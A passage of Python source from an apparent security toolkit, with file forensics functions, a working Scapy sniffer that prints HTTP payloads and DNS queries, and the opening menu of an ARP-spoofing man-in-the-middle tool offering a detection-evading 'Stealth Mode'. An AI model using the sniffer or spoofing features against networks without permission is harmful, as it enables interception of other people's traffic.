        byte_counts = {}
        for byte in data:
            byte_counts[byte] = byte_counts.get(byte, 0) + 1
        
        unique_bytes = len(byte_counts)
        if unique_bytes < 50:
            compression_indicators.append(f"Low byte diversity ({unique_bytes} unique bytes)")
        
        # Check for null bytes (common in compressed data)
        null_count = byte_counts.get(0, 0)
        null_percentage = (null_count / file_size) * 100
        if null_percentage > 10:
            compression_indicators.append(f"High null byte content ({null_percentage:.1f}%)")
        
        # Display results
        if RICH_AVAILABLE:
            table = Table(title=f"Compression Analysis - {os.path.basename(file_path)}")
            table.add_column("Property", style="cyan", no_wrap=True)
            table.add_column("Value", style="green")
            
            table.add_row("File Size", f"{file_size:,} bytes")
            table.add_row("Entropy", f"{entropy:.4f} bits/byte")
            table.add_row("Unique Bytes", str(unique_bytes))
            table.add_row("Null Bytes", f"{null_count:,} ({null_percentage:.1f}%)")
            
            if detected_compression:
                for comp_type, method in detected_compression:
                    table.add_row("Detected Compression", f"{comp_type} ({method})")
            else:
                table.add_row("Detected Compression", "None (by signature)")
            
            console.print(table)
            
            if compression_indicators:
                console.print("\n[bold yellow]Compression Indicators:[/bold yellow]")
                for indicator in compression_indicators:
                    console.print(f"• {indicator}")
        else:
            print(f"\nCompression Analysis for {os.path.basename(file_path)}:")
            print("=" * 60)
            print(f"File Size: {file_size:,} bytes")
            print(f"Entropy: {entropy:.4f} bits/byte")
            print(f"Unique bytes: {unique_bytes}")
            print(f"Null bytes: {null_count:,} ({null_percentage:.1f}%)")
            
            if detected_compression:
                for comp_type, method in detected_compression:
                    print(f"Detected Compression: {comp_type} ({method})")
            else:
                print("Detected Compression: None (by signature)")
            
            if compression_indicators:
                print("\nCompression Indicators:")
                for indicator in compression_indicators:
                    print(f"• {indicator}")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error detecting compression: {e}[/red]")
        else:
            print(f"Error detecting compression: {e}")


def binary_pattern_analysis(file_path):
    """Search for specific binary patterns in the file."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Binary Pattern Analysis[/bold blue]", border_style="blue"))
    else:
        print("\n[Binary Pattern Analysis]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        
        # Common patterns to search for
        patterns = {
            "Null bytes": b'\x00\x00\x00\x00',
            "ASCII text": b'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
            "Lowercase text": b'abcdefghijklmnopqrstuvwxyz',
            "Numbers": b'0123456789',
            "Common strings": b'password',
            "URL patterns": b'http://',
            "Email patterns": b'@',
            "IP addresses": b'192.168.',
            "Executable markers": b'MZ',
            "ELF markers": b'\x7fELF',
            "PDF markers": b'%PDF',
            "ZIP markers": b'PK\x03\x04',
        }
        
        found_patterns = {}
        
        for pattern_name, pattern in patterns.items():
            count = data.count(pattern)
            if count > 0:
                found_patterns[pattern_name] = (pattern, count)
        
        # Search for custom pattern
        custom_pattern = safe_input("Enter custom pattern (hex, e.g., '41424344' for 'ABCD'): ")
        if custom_pattern:
            try:
                custom_bytes = bytes.fromhex(custom_pattern)
                count = data.count(custom_bytes)
                if count > 0:
                    found_patterns["Custom pattern"] = (custom_bytes, count)
            except ValueError:
                if RICH_AVAILABLE:
                    console.print("[red]Invalid hex pattern.[/red]")
                else:
                    print("Invalid hex pattern.")
        
        # Display results
        if RICH_AVAILABLE:
            if found_patterns:
                table = Table(title=f"Pattern Analysis - {os.path.basename(file_path)}")
                table.add_column("Pattern", style="cyan", no_wrap=True)
                table.add_column("Hex Value", style="green", no_wrap=True)
                table.add_column("Count", style="yellow", justify="right")
                table.add_column("ASCII", style="magenta")
                
                for pattern_name, (pattern, count) in found_patterns.items():
                    hex_value = ' '.join(f'{b:02x}' for b in pattern)
                    ascii_value = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in pattern)
                    table.add_row(pattern_name, hex_value, str(count), ascii_value)
                
                console.print(table)
            else:
                console.print("[yellow]No patterns found.[/yellow]")
        else:
            if found_patterns:
                print(f"\nPattern Analysis for {os.path.basename(file_path)}:")
                print("=" * 80)
                for pattern_name, (pattern, count) in found_patterns.items():
                    hex_value = ' '.join(f'{b:02x}' for b in pattern)
                    ascii_value = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in pattern)
                    print(f"{pattern_name:20} | {hex_value:30} | {count:5} | {ascii_value}")
            else:
                print("No patterns found.")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error analyzing patterns: {e}[/red]")
        else:
            print(f"Error analyzing patterns: {e}")


def file_structure_analysis(file_path):
    """Analyze the internal structure of the file."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]File Structure Analysis[/bold blue]", border_style="blue"))
    else:
        print("\n[File Structure Analysis]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        
        # Analyze file structure
        structure_info = []
        
        # Check for headers and footers
        if data.startswith(b'PK'):
            structure_info.append("ZIP archive structure detected")
        elif data.startswith(b'%PDF'):
            structure_info.append("PDF document structure detected")
        elif data.startswith(b'MZ'):
            structure_info.append("Windows executable structure detected")
        elif data.startswith(b'\x7fELF'):
            structure_info.append("ELF executable structure detected")
        
        # Check for sections with different characteristics
        if file_size > 1024:
            # Analyze first 1KB vs last 1KB
            first_1k = data[:1024]
            last_1k = data[-1024:]
            
            first_entropy = calculate_entropy(first_1k)
            last_entropy = calculate_entropy(last_1k)
            
            if abs(first_entropy - last_entropy) > 1.0:
                structure_info.append(f"Entropy varies significantly (start: {first_entropy:.2f}, end: {last_entropy:.2f})")
        
        # Check for repeated sections
        if file_size > 1000:
            # Look for repeated 16-byte patterns
            pattern_size = 16
            patterns = {}
            
            for i in range(0, file_size - pattern_size, pattern_size):
                pattern = data[i:i+pattern_size]
                patterns[pattern] = patterns.get(pattern, 0) + 1
            
            repeated_patterns = [p for p, count in patterns.items() if count > 1]
            if repeated_patterns:
                structure_info.append(f"Found {len(repeated_patterns)} repeated {pattern_size}-byte patterns")
        
        # Check for null sections
        null_sections = 0
        for i in range(0, file_size, 1024):
            chunk = data[i:i+1024]
            if all(b == 0 for b in chunk):
                null_sections += 1
        
        if null_sections > 0:
            structure_info.append(f"Contains {null_sections} null-filled sections")
        
        # Display results
        if RICH_AVAILABLE:
            table = Table(title=f"File Structure Analysis - {os.path.basename(file_path)}")
            table.add_column("Property", style="cyan", no_wrap=True)
            table.add_column("Value", style="green")
            
            table.add_row("File Size", f"{file_size:,} bytes")
            table.add_row("Structure Type", "Complex" if len(structure_info) > 2 else "Simple")
            
            console.print(table)
            
            if structure_info:
                console.print("\n[bold yellow]Structure Characteristics:[/bold yellow]")
                for info in structure_info:
                    console.print(f"• {info}")
            else:
                console.print("\n[yellow]No specific structure characteristics detected.[/yellow]")
        else:
            print(f"\nFile Structure Analysis for {os.path.basename(file_path)}:")
            print("=" * 60)
            print(f"File Size: {file_size:,} bytes")
            print(f"Structure Type: {'Complex' if len(structure_info) > 2 else 'Simple'}")
            
            if structure_info:
                print("\nStructure Characteristics:")
                for info in structure_info:
                    print(f"• {info}")
            else:
                print("\nNo specific structure characteristics detected.")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error analyzing file structure: {e}[/red]")
        else:
            print(f"Error analyzing file structure: {e}")


def comprehensive_file_report(file_path):
    """Generate a comprehensive analysis report for the file."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Comprehensive File Analysis Report[/bold blue]", border_style="blue"))
    else:
        print("\n[Comprehensive File Analysis Report]")
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        file_size = len(data)
        file_name = os.path.basename(file_path)
        
        # Perform all analyses
        entropy = calculate_entropy(data)
        is_encrypted = is_likely_encrypted(data)
        
        # File type detection
        with open(file_path, 'rb') as f:
            header = f.read(64)
        
        signatures = {
            b'\xff\xd8\xff': 'JPEG Image',
            b'\x89PNG\r\n\x1a\n': 'PNG Image',
            b'GIF8': 'GIF Image',
            b'BM': 'BMP Image',
            b'%PDF': 'PDF Document',
            b'PK\x03\x04': 'ZIP Archive',
            b'\x1f\x8b': 'GZIP Archive',
            b'\x7fELF': 'ELF Executable',
            b'MZ': 'Windows Executable',
            b'\xca\xfe\xba\xbe': 'Java Class File',
        }
        
        detected_type = "Unknown/Text"
        for signature, file_type in signatures.items():
            if header.startswith(signature):
                detected_type = file_type
                break
        
        # Byte analysis
        byte_counts = {}
        for byte in data:
            byte_counts[byte] = byte_counts.get(byte, 0) + 1
        
        unique_bytes = len(byte_counts)
        most_common_byte = max(byte_counts, key=byte_counts.get)
        most_common_count = byte_counts[most_common_byte]
        
        # String analysis
        strings = extract_strings_from_data(data, 4, 'ascii')
        
        # Compression analysis
        compression_detected = any(data.startswith(sig) for sig in [b'\x1f\x8b', b'PK\x03\x04', b'BZh'])
        
        # Display comprehensive report
        if RICH_AVAILABLE:
            # Main info table
            main_table = Table(title=f"File Analysis Report - {file_name}")
            main_table.add_column("Property", style="cyan", no_wrap=True)
            main_table.add_column("Value", style="green")
            
            main_table.add_row("File Name", file_name)
            main_table.add_row("File Size", f"{file_size:,} bytes")
            main_table.add_row("File Type", detected_type)
            main_table.add_row("Entropy", f"{entropy:.4f} bits/byte")
            main_table.add_row("Unique Bytes", str(unique_bytes))
            main_table.add_row("Likely Encrypted", "Yes" if is_encrypted else "No")
            main_table.add_row("Compression Detected", "Yes" if compression_detected else "No")
            main_table.add_row("Extracted Strings", str(len(strings)))
            
            console.print(main_table)
            
            # Entropy interpretation
            if entropy < 4.0:
                entropy_level = "Low (likely text or structured data)"
            elif entropy < 6.0:
                entropy_level = "Medium (mixed content)"
            elif entropy < 7.5:
                entropy_level = "High (compressed or encoded data)"
            else:
                entropy_level = "Very High (likely encrypted or random)"
            
            console.print(f"\n[bold cyan]Entropy Level:[/bold cyan] {entropy_level}")
            
            # Most common bytes
            console.print(f"\n[bold cyan]Most Common Byte:[/bold cyan] 0x{most_common_byte:02x} ({most_common_count:,} times, {most_common_count/file_size*100:.2f}%)")
            
            # Sample strings
            if strings:
                console.print(f"\n[bold cyan]Sample Strings (first 10):[/bold cyan]")
                for i, string in enumerate(strings[:10], 1):
                    display_string = string[:50] + "..." if len(string) > 50 else string
                    console.print(f"  {i}. {display_string}")
                
                if len(strings) > 10:
                    console.print(f"  ... and {len(strings) - 10} more strings")
        else:
            print(f"\nComprehensive File Analysis Report for {file_name}")
            print("=" * 80)
            print(f"File Name: {file_name}")
            print(f"File Size: {file_size:,} bytes")
            print(f"File Type: {detected_type}")
            print(f"Entropy: {entropy:.4f} bits/byte")
            print(f"Unique Bytes: {unique_bytes}")
            print(f"Likely Encrypted: {'Yes' if is_encrypted else 'No'}")
            print(f"Compression Detected: {'Yes' if compression_detected else 'No'}")
            print(f"Extracted Strings: {len(strings)}")
            
            # Entropy interpretation
            if entropy < 4.0:
                entropy_level = "Low (likely text or structured data)"
            elif entropy < 6.0:
                entropy_level = "Medium (mixed content)"
            elif entropy < 7.5:
                entropy_level = "High (compressed or encoded data)"
            else:
                entropy_level = "Very High (likely encrypted or random)"
            
            print(f"\nEntropy Level: {entropy_level}")
            print(f"Most Common Byte: 0x{most_common_byte:02x} ({most_common_count:,} times, {most_common_count/file_size*100:.2f}%)")
            
            # Sample strings
            if strings:
                print(f"\nSample Strings (first 10):")
                for i, string in enumerate(strings[:10], 1):
                    display_string = string[:50] + "..." if len(string) > 50 else string
                    print(f"  {i}. {display_string}")
                
                if len(strings) > 10:
                    print(f"  ... and {len(strings) - 10} more strings")
        
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error generating report: {e}[/red]")
        else:
            print(f"Error generating report: {e}")


def file_metadata_extractor():
    """Enhanced metadata extraction with comprehensive analysis for various file types."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced File Metadata Extractor[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced File Metadata Extractor]")
    
    file_path = safe_file_input("Enter file path: ")
    if not file_path:
        return
    
    try:
        # Basic file information
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        abs_path = os.path.abspath(file_path)
        
        if RICH_AVAILABLE:
            console.print(f"\n[bold cyan]Analyzing:[/bold cyan] {file_name}")
        else:
            print(f"\nAnalyzing: {file_name}")
        
        # Basic file info
        basic_info = extract_basic_file_info(file_path)
        
        # File type detection
        file_type_info = detect_file_type_advanced(file_path)
        
        # Extract metadata based on file type
        metadata_info = extract_file_specific_metadata(file_path, file_type_info)
        
        # Display results
        if RICH_AVAILABLE:
            # Basic info table
            basic_table = Table(title="Basic File Information")
            basic_table.add_column("Property", style="cyan", no_wrap=True)
            basic_table.add_column("Value", style="green")
            
            for key, value in basic_info.items():
                basic_table.add_row(key, str(value))
            
            console.print(basic_table)
            
            # File type table
            if file_type_info:
                type_table = Table(title="File Type Analysis")
                type_table.add_column("Property", style="cyan", no_wrap=True)
                type_table.add_column("Value", style="green")
                
                for key, value in file_type_info.items():
                    type_table.add_row(key, str(value))
                
                console.print(type_table)
            
            # Metadata table
            if metadata_info:
                meta_table = Table(title="Extracted Metadata")
                meta_table.add_column("Property", style="cyan", no_wrap=True)
                meta_table.add_column("Value", style="green")
                
                for key, value in metadata_info.items():
                    # Truncate long values
                    display_value = str(value)
                    if len(display_value) > 100:
                        display_value = display_value[:100] + "..."
                    meta_table.add_row(key, display_value)
                
                console.print(meta_table)
        else:
            # Basic info
            print("\n[Basic File Information]")
            print("=" * 50)
            for key, value in basic_info.items():
                print(f"{key}: {value}")
            
            # File type info
            if file_type_info:
                print("\n[File Type Analysis]")
                print("=" * 50)
                for key, value in file_type_info.items():
                    print(f"{key}: {value}")
            
            # Metadata info
            if metadata_info:
                print("\n[Extracted Metadata]")
                print("=" * 50)
                for key, value in metadata_info.items():
                    print(f"{key}: {value}")
        
        # Save metadata option
        if RICH_AVAILABLE:
            if console.input("\n[bold yellow]Save metadata to file? (y/n): [/bold yellow]").lower() in ('y', 'yes'):
                save_metadata_to_file(file_path, basic_info, file_type_info, metadata_info)
        else:
            save_choice = safe_input("\nSave metadata to file? (y/n): ")
            if save_choice and save_choice.lower() in ('y', 'yes'):
                save_metadata_to_file(file_path, basic_info, file_type_info, metadata_info)
            
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]Error reading file metadata: {e}[/red]")
        else:
            print(f"Error reading file metadata: {e}")


def extract_basic_file_info(file_path):
    """Extract basic file information."""
    info = {}
    
    try:
        # Basic file stats
        stat_info = os.stat(file_path)
        
        info["File Name"] = os.path.basename(file_path)
        info["File Size"] = f"{stat_info.st_size:,} bytes"
        info["File Path"] = os.path.abspath(file_path)
        
        # Timestamps
        try:
            created_time = datetime.datetime.fromtimestamp(stat_info.st_ctime)
            modified_time = datetime.datetime.fromtimestamp(stat_info.st_mtime)
            accessed_time = datetime.datetime.fromtimestamp(stat_info.st_atime)
            
            info["Created"] = created_time.strftime("%Y-%m-%d %H:%M:%S")
            info["Modified"] = modified_time.strftime("%Y-%m-%d %H:%M:%S")
            info["Accessed"] = accessed_time.strftime("%Y-%m-%d %H:%M:%S")
        except Exception as e:
            info["Timestamp Error"] = str(e)
        
        # Permissions
        try:
            info["Permissions"] = oct(stat_info.st_mode)[-3:]
            info["Owner ID"] = stat_info.st_uid
            info["Group ID"] = stat_info.st_gid
        except Exception as e:
            info["Permission Error"] = str(e)
        
        # File attributes
        info["Inode"] = stat_info.st_ino
        info["Device"] = stat_info.st_dev
        info["Hard Links"] = stat_info.st_nlink
        
    except Exception as e:
        info["Error"] = str(e)
    
    return info


def detect_file_type_advanced(file_path):
    """Advanced file type detection with detailed analysis."""
    info = {}
    
    try:
        with open(file_path, 'rb') as f:
            header = f.read(64)
            f.seek(-64, 2)  # Go to end
            footer = f.read(64)
        
        # Comprehensive file signatures
        signatures = {
            # Images
            b'\xff\xd8\xff': ('JPEG Image', 'image/jpeg'),
            b'\x89PNG\r\n\x1a\n': ('PNG Image', 'image/png'),
            b'GIF8': ('GIF Image', 'image/gif'),
            b'BM': ('BMP Image', 'image/bmp'),
            b'II*\x00': ('TIFF Image (Little Endian)', 'image/tiff'),
            b'MM\x00*': ('TIFF Image (Big Endian)', 'image/tiff'),
            b'RIFF': ('RIFF Container', 'application/octet-stream'),
            
            # Documents
            b'%PDF': ('PDF Document', 'application/pdf'),
            b'PK\x03\x04': ('ZIP Archive', 'application/zip'),
            b'\x50\x4b\x03\x04': ('ZIP Archive', 'application/zip'),
            b'\x1f\x8b': ('GZIP Archive', 'application/gzip'),
            b'BZh': ('BZIP2 Archive', 'application/x-bzip2'),
            b'Rar!': ('RAR Archive', 'application/x-rar'),
            
            # Office Documents
            b'\x50\x4b\x03\x04\x14\x00\x06\x00': ('Office 2007+ Document', 'application/vnd.openxmlformats-officedocument'),
            b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1': ('Office 97-2003 Document', 'application/vnd.ms-office'),
            
            # Executables
            b'\x7fELF': ('ELF Executable', 'application/x-executable'),
            b'MZ': ('Windows Executable', 'application/x-executable'),
            b'\xfe\xed\xfa': ('Mach-O Executable', 'application/x-executable'),
            b'\xca\xfe\xba\xbe': ('Java Class File', 'application/java-vm'),
            
            # Audio/Video
            b'ID3': ('MP3 Audio', 'audio/mpeg'),
            b'\xff\xfb': ('MP3 Audio', 'audio/mpeg'),
            b'ftyp': ('MP4 Video', 'video/mp4'),
            b'AVI ': ('AVI Video', 'video/x-msvideo'),
            
            # Databases
            b'SQLite format 3': ('SQLite Database', 'application/x-sqlite3'),
            
            # Archives
            b'\x37\x7A\xBC\xAF': ('7-Zip Archive', 'application/x-7z-compressed'),
        }
        
        detected_type = "Unknown/Text"
        mime_type = "text/plain"
        
        # Check header signatures
        for signature, (file_type, mime) in signatures.items():
            if header.startswith(signature):
                detected_type = file_type
                mime_type = mime
                break
        
        # Additional analysis for text files
        if detected_type == "Unknown/Text":
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    sample = f.read(1000)
                    if sample.isprintable():
                        detected_type = "Text File"
                        mime_type = "text/plain"
                        
                        # Try to detect specific text types
                        if sample.startswith('<?xml'):
                            detected_type = "XML Document"
                            mime_type = "application/xml"
                        elif sample.startswith('<!DOCTYPE') or '<html' in sample:
                            detected_type = "HTML Document"
                            mime_type = "text/html"
                        elif sample.startswith('#!/'):
                            detected_type = "Script File"
                            mime_type = "text/x-script"
            except:
                pass
        
        info["Detected Type"] = detected_type
        info["MIME Type"] = mime_type
        info["Header (hex)"] = ' '.join(f'{b:02x}' for b in header[:16])
        
        # File extension analysis
        _, ext = os.path.splitext(file_path)
        if ext:
            info["File Extension"] = ext.lower()
        
    except Exception as e:
        info["Detection Error"] = str(e)
    
    return info


def extract_file_specific_metadata(file_path, file_type_info):
    """Extract metadata specific to the file type."""
    metadata = {}
    
    try:
        detected_type = file_type_info.get("Detected Type", "Unknown")
        
        # Image metadata (EXIF)
        if any(img_type in detected_type for img_type in ['JPEG', 'PNG', 'GIF', 'BMP', 'TIFF']):
            try:
                with open(file_path, 'rb') as f:
                    tags = exifread.process_file(f, details=False)
                
                if tags:
                    for tag in tags:
                        metadata[f"EXIF_{tag}"] = str(tags[tag])
            except Exception as e:
                metadata["EXIF Error"] = str(e)
        
        # PDF metadata
        elif "PDF" in detected_type:
            try:
                # Basic PDF analysis
                with open(file_path, 'rb') as f:
                    content = f.read(1024)
                
                # Look for PDF metadata
                if b'/Title' in content:
                    metadata["PDF Title"] = "Found"
                if b'/Author' in content:
                    metadata["PDF Author"] = "Found"
                if b'/Creator' in content:
                    metadata["PDF Creator"] = "Found"
                if b'/Producer' in content:
                    metadata["PDF Producer"] = "Found"
                if b'/CreationDate' in content:
                    metadata["PDF Creation Date"] = "Found"
                if b'/ModDate' in content:
                    metadata["PDF Modification Date"] = "Found"
            except Exception as e:
                metadata["PDF Error"] = str(e)
        
        # ZIP archive metadata
        elif "ZIP" in detected_type:
            try:
                import zipfile
                with zipfile.ZipFile(file_path, 'r') as zip_file:
                    metadata["ZIP Files"] = len(zip_file.namelist())
                    metadata["ZIP Comment"] = zip_file.comment.decode('utf-8', errors='ignore') if zip_file.comment else "None"
                    
                    # List first few files
                    file_list = zip_file.namelist()[:5]
                    metadata["ZIP Contents"] = ', '.join(file_list)
                    if len(zip_file.namelist()) > 5:
                        metadata["ZIP Contents"] += f" ... and {len(zip_file.namelist()) - 5} more"
            except Exception as e:
                metadata["ZIP Error"] = str(e)
        
        # Executable metadata
        elif "Executable" in detected_type:
            try:
                with open(file_path, 'rb') as f:
                    header = f.read(512)
                
                # Look for strings in executable
                strings = extract_strings_from_data(header, 4, 'ascii')
                if strings:
                    metadata["Executable Strings"] = f"Found {len(strings)} strings"
                
                # Check for common executable patterns
                if b'PE\x00\x00' in header:
                    metadata["PE Header"] = "Found"
                if b'.text' in header:
                    metadata["Text Section"] = "Found"
                if b'.data' in header:
                    metadata["Data Section"] = "Found"
            except Exception as e:
                metadata["Executable Error"] = str(e)
        
        # Text file analysis
        elif "Text" in detected_type:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(10000)  # Read first 10KB
                
                # Analyze text content
                lines = content.split('\n')
                metadata["Text Lines"] = len(lines)
                metadata["Text Characters"] = len(content)
                metadata["Text Words"] = len(content.split())
                
                # Look for common patterns
                if '@' in content:
                    metadata["Email Addresses"] = "Possible"
                if 'http://' in content or 'https://' in content:
                    metadata["URLs"] = "Possible"
                if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', content):
                    metadata["IP Addresses"] = "Possible"
            except Exception as e:
                metadata["Text Analysis Error"] = str(e)
        
    except Exception as e:
        metadata["General Error"] = str(e)
    
    return metadata


def save_metadata_to_file(file_path, basic_info, file_type_info, metadata_info):
    """Save extracted metadata to a file."""
    try:
        output_file = f"{os.path.splitext(file_path)[0]}_metadata.txt"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"File Metadata Report\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            
            f.write("Basic File Information:\n")
            f.write("-" * 30 + "\n")
            for key, value in basic_info.items():
                f.write(f"{key}: {value}\n")
            
            f.write("\nFile Type Analysis:\n")
            f.write("-" * 30 + "\n")
            for key, value in file_type_info.items():
                f.write(f"{key}: {value}\n")
            
            f.write("\nExtracted Metadata:\n")
            f.write("-" * 30 + "\n")
            for key, value in metadata_info.items():
                f.write(f"{key}: {value}\n")
        
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"[green]Metadata saved to: {output_file}[/green]")
        else:
            print(f"Metadata saved to: {output_file}")
            
    except Exception as e:
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"[red]Error saving metadata: {e}[/red]")
        else:
            print(f"Error saving metadata: {e}")


def network_sniffer():
    """Network packet capture and analysis tool."""
    print("\n[Network Sniffer]")
    print("⚠️  WARNING: This tool is for educational purposes and local network testing only.")
    print("Do not capture packets on networks you don't own or have permission to monitor.")
    
    # Check if required libraries are available
    try:
        import scapy.all as scapy
    except ImportError:
        print("❌ Scapy library not found.")
        print("Please install: pip install scapy")
        return
    
    print("\nSniffer Options:")
    print("1. Capture all packets (basic)")
    print("2. Capture HTTP traffic")
    print("3. Capture DNS queries")
    print("4. Capture specific protocol")
    print("5. Live packet analysis")
    print("0. Back to main menu")
    
    choice = safe_input("Select capture mode: ")
    if not choice:
        return
    
    if choice == "0":
        return
    
    # Get interface
    try:
        interfaces = scapy.get_if_list()
        print(f"\nAvailable interfaces: {interfaces}")
        interface = safe_input(f"Enter interface name (default: {interfaces[0]}): ")
        if not interface:
            interface = interfaces[0]
    except Exception as e:
        print(f"Error getting interfaces: {e}")
        return
    
    # Get packet count
    packet_count_input = safe_input("Enter number of packets to capture (default: 50): ")
    if not packet_count_input:
        packet_count = 50
    else:
        try:
            packet_count = int(packet_count_input)
            if packet_count <= 0 or packet_count > 1000:
                print("Packet count must be between 1 and 1000.")
                return
        except ValueError:
            print("Invalid packet count.")
            return
    
    # Get timeout
    timeout_input = safe_input("Enter capture timeout in seconds (default: 30): ")
    if not timeout_input:
        timeout = 30
    else:
        try:
            timeout = int(timeout_input)
            if timeout <= 0 or timeout > 300:
                print("Timeout must be between 1 and 300 seconds.")
                return
        except ValueError:
            print("Invalid timeout.")
            return
    
    print(f"\nStarting packet capture on {interface}...")
    print(f"Capturing {packet_count} packets with {timeout}s timeout")
    print("=" * 60)
    
    def packet_callback(packet):
        """Callback function to process captured packets."""
        try:
            # Basic packet info
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                protocol = packet[scapy.IP].proto
                
                # Protocol identification
                if packet.haslayer(scapy.TCP):
                    src_port = packet[scapy.TCP].sport
                    dst_port = packet[scapy.TCP].dport
                    print(f"TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                    
                    # HTTP analysis
                    if dst_port == 80 or src_port == 80:
                        if packet.haslayer(scapy.Raw):
                            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                            if 'HTTP' in payload or 'GET' in payload or 'POST' in payload:
                                print(f"  HTTP: {payload[:100]}...")
                
                elif packet.haslayer(scapy.UDP):
                    src_port = packet[scapy.UDP].sport
                    dst_port = packet[scapy.UDP].dport
                    print(f"UDP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                    
                    # DNS analysis
                    if dst_port == 53 or src_port == 53:
                        if packet.haslayer(scapy.DNS):
                            dns = packet[scapy.DNS]
                            if dns.qr == 0:  # Query
                                if dns.qd:
                                    print(f"  DNS Query: {dns.qd.qname.decode()}")
                            else:  # Response
                                if dns.an:
                                    for answer in dns.an:
                                        if hasattr(answer, 'rdata'):
                                            print(f"  DNS Response: {answer.rdata}")
                
                elif packet.haslayer(scapy.ICMP):
                    icmp_type = packet[scapy.ICMP].type
                    print(f"ICMP: {src_ip} -> {dst_ip} (Type: {icmp_type})")
                
                else:
                    print(f"IP: {src_ip} -> {dst_ip} (Protocol: {protocol})")
            
            elif packet.haslayer(scapy.ARP):
                src_ip = packet[scapy.ARP].psrc
                dst_ip = packet[scapy.ARP].pdst
                op = packet[scapy.ARP].op
                op_str = "Request" if op == 1 else "Reply"
                print(f"ARP {op_str}: {src_ip} -> {dst_ip}")
            
            else:
                print(f"Other: {packet.summary()}")
                
        except Exception as e:
            print(f"Error processing packet: {e}")
    
    try:
        if choice == "1":  # Capture all packets
            print("Capturing all packets...")
            packets = scapy.sniff(iface=interface, count=packet_count, timeout=timeout, prn=packet_callback)
        
        elif choice == "2":  # HTTP traffic
            print("Capturing HTTP traffic...")
            filter_str = "tcp port 80 or tcp port 443"
            packets = scapy.sniff(iface=interface, count=packet_count, timeout=timeout, 
                                filter=filter_str, prn=packet_callback)
        
        elif choice == "3":  # DNS queries
            print("Capturing DNS queries...")
            filter_str = "udp port 53"
            packets = scapy.sniff(iface=interface, count=packet_count, timeout=timeout, 
                                filter=filter_str, prn=packet_callback)
        
        elif choice == "4":  # Specific protocol
            protocol = safe_input("Enter protocol filter (e.g., 'tcp', 'udp', 'icmp'): ")
            if protocol:
                print(f"Capturing {protocol} traffic...")
                packets = scapy.sniff(iface=interface, count=packet_count, timeout=timeout, 
                                    filter=protocol, prn=packet_callback)
            else:
                print("No protocol specified.")
                return
        
        elif choice == "5":  # Live analysis
            print("Starting live packet analysis (press Ctrl+C to stop)...")
            try:
                scapy.sniff(iface=interface, prn=packet_callback, store=0)
            except KeyboardInterrupt:
                print("\nCapture stopped by user.")
        
        print(f"\n✅ Captured {len(packets) if 'packets' in locals() else 'unknown'} packets")
        
        # Ask if user wants to save capture
        save_choice = safe_input("Save capture to PCAP file? (y/n): ")
        if save_choice and save_choice.lower() in ('y', 'yes'):
            filename = safe_input("Enter filename (default: capture.pcap): ")
            if not filename:
                filename = "capture.pcap"
            try:
                if 'packets' in locals():
                    scapy.wrpcap(filename, packets)
                    print(f"Capture saved to {filename}")
                else:
                    print("No packets to save.")
            except Exception as e:
                print(f"Error saving capture: {e}")
    
    except KeyboardInterrupt:
        print("\n⚠️  Capture interrupted by user")
    except Exception as e:
        print(f"\n❌ Capture error: {e}")


def arp_spoofing_simulator():
    """Enhanced ARP spoofing simulator with lab-only MITM test mode and safety features."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced ARP Spoofing Simulator[/bold blue]", border_style="blue"))
        console.print("[bold red]⚠️  WARNING: This is for educational purposes only.[/bold red]")
        console.print("[bold red]Only use on networks you own or have explicit permission to test.[/bold red]")
        console.print("[bold red]This tool includes lab-only MITM test mode with safety controls.[/bold red]")
    else:
        print("\n[Enhanced ARP Spoofing Simulator]")
        print("⚠️  WARNING: This is for educational purposes only.")
        print("Only use on networks you own or have explicit permission to test.")
        print("This tool includes lab-only MITM test mode with safety controls.")
    
    if not SCAPY_AVAILABLE:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Scapy is required for ARP spoofing. Please install it: pip install scapy[/red]")
        else:
            print(colored("Scapy is required for ARP spoofing. Please install it: pip install scapy", Colors.FAIL))
        return
    
    # Enhanced options with lab-only MITM test mode
    if RICH_AVAILABLE:
        console.print("\n[bold cyan]ARP Spoofing Options:[/bold cyan]")
        console.print("1. [green]Standard ARP Spoofing[/green] - Basic man-in-the-middle")
        console.print("2. [yellow]Stealth Mode[/yellow] - Reduced packet rate to avoid detection")
        console.print("3. [red]Aggressive Mode[/red] - High packet rate for testing")
        console.print("4. [blue]Detection Test[/blue] - Test for firewall/IDS detection")
